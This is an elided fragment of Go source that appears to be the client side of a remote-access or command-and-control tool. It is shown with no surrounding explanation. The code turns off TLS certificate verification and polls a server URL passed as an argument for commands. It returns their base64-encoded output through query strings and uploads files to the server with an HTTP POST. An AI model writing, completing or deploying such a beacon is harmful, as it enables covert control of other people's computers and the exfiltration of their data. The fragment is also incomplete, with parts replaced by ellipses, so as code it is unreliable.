...
_, err := http.Get(os.Args[2]+"/ENDPOINT?MODE=res&id="+id+"&RESPONSE=" + sEnc )
if err != nil {
	fmt.Println(err)
...
id := os.Args[1]
http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
res, err := http.Get(os.Args[2]+"/ENDPOINT?MODE=cmds&id="+id+"&o=G")
if err != nil {
	fmt.Println(err)
...
for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
      ...
      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
      gimme, err := http.Get(os.Args[2]+"/ENDPOINT?MODE=res&RESPONSE="+b64Output+"&id="+id)
      if err != nil {
	fmt.Println(err)
	time.Sleep(10 * time.Second)
	return
   ...
   if err != nil {
      ...
      msgup, err := http.Get(os.Args[2]+"/ENDPOINT?MODE=res&RESPONSE="+filemsgEnc+"&id="+id)
      if err != nil {
	...
	return
      ...
      fmt.Println(msgup)
      gimme, err := http.Post(os.Args[2]+"/ENDPOINT?MODE=up&id="+id, ct, body)
      if err != nil {
	fmt.Println(err)
	time.Sleep(10 * time.Second)
	return
